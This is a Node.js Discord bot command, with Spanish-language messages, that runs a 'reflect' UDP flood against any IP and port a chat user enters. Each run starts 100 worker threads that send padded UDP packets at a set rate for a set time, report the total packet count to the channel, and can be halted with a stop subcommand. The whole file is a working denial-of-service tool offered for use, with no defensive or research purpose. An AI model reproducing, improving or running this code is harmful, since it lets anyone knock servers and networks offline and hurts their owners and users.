const { EmbedBuilder } = require('discord.js');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

let workers = [];
let attackInProgress = false;
let totalPacketsSent = 0;

module.exports = {
    name: 'reflect',
    description: 'Inicia o detiene un ataque UDP con PPS',
    execute(message, args) {
        if (args[0] === 'stop') {
            if (attackInProgress) {
                stopAttack(message);
            } else {
                const noAttackEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription('❌ No hay ningún ataque en curso.')
                    .setTimestamp();
                return message.channel.send({ embeds: [noAttackEmbed] });
            }
            return; // Evitar mostrar el mensaje de uso
        }

        if (args.length !== 4) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Uso: .reflect <IP> <Port> <Paquetes> <Time>')
                .setTimestamp();
            return message.channel.send({ embeds: [usageEmbed] });
        }

        const [ip, port, pps, time] = args;

        if (!isValidIP(ip)) {
            const invalidIpEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('❌ IP no válida.')
                .setTimestamp();
            return message.channel.send({ embeds: [invalidIpEmbed] });
        }

        const embed = new EmbedBuilder()
            .setColor(getRandomColor())
            .setTitle('☠️ Iniciando ataque UDP Reflect ☠️')
            .setDescription(`**Método:** .reflect\n\n**IP:** ${ip}\n**Port:** ${port}\n**Paquetes:** ${pps}\n**Time:** ${time}`)
            .setTimestamp();

        message.channel.send({ embeds: [embed] });

        attackInProgress = true;
        let workersCompleted = 0;

        for (let i = 0; i < 100; i++) { // Ejecutar 75 ataques simultáneamente
            const worker = new Worker(__filename, {
                workerData: { ip, port, pps, time }
            });

            workers.push(worker);

            worker.on('message', (msg) => {
                if (msg.packetsSent) {
                    totalPacketsSent += msg.packetsSent;
                }

                workersCompleted++;
                if (workersCompleted === 100) {
                    attackInProgress = false;
                    const finalEmbed = new EmbedBuilder()
                        .setColor(getRandomColor())
                        .setDescription(`✅ **Ataque finalizado**. Paquetes enviados: ${totalPacketsSent} 🚀`)
                        .setTimestamp();
                    message.channel.send({ embeds: [finalEmbed] });
                }
            });

            worker.on('error', (err) => {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription(`❌ Error en el worker: ${err.message}`)
                    .setTimestamp();
                message.channel.send({ embeds: [errorEmbed] });
            });
        }
    }
};

function stopAttack(message) {
    workers.forEach(worker => worker.terminate());
    workers = [];
    attackInProgress = false;

    const stopEmbed = new EmbedBuilder()
        .setColor('#FF0000')
        .setDescription(`🛑 **Ataque detenido correctamente**`)
        .setTimestamp();
    message.channel.send({ embeds: [stopEmbed] });
}

function isValidIP(ip) {
    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return regex.test(ip);
}

function getRandomColor() {
    const colors = ['#FF5733', '#33FF57', '#3357FF', '#FF33A1', '#A133FF'];
    return colors[Math.floor(Math.random() * colors.length)];
}

if (!isMainThread) {
    const { ip, port, pps, time } = workerData;
    const udpClient = dgram.createSocket('udp4');
    const packet = Buffer.from('UDP Packet - - UDP PPS - - UDP SOCKETS - - Contenido adicional para poder tener unos paqeutes mas pesados que los demas metodo XDDDDDDDDDDDDD'); // Agregar más contenido al paquete
    let packetsSent = 0;

    udpClient.on('error', (err) => {
        console.error(`Error: ${err.message}`);
        parentPort.postMessage({ error: err.message });
        udpClient.close();
    });

    udpClient.on('close', () => {
        parentPort.postMessage({ error: 'El servidor está offline o no se puede alcanzar.' });
    });

    const interval = setInterval(() => {
        for (let i = 0; i < pps; i++) {
            udpClient.send(packet, port, ip, (err) => {
                if (err) {
                    console.error(err);
                } else {
                    packetsSent++;
                }
            });
        }
    }, 1000 / pps);

    setTimeout(() => {
        clearInterval(interval);
        udpClient.close();
        parentPort.postMessage({ packetsSent });
    }, time * 1000);
}
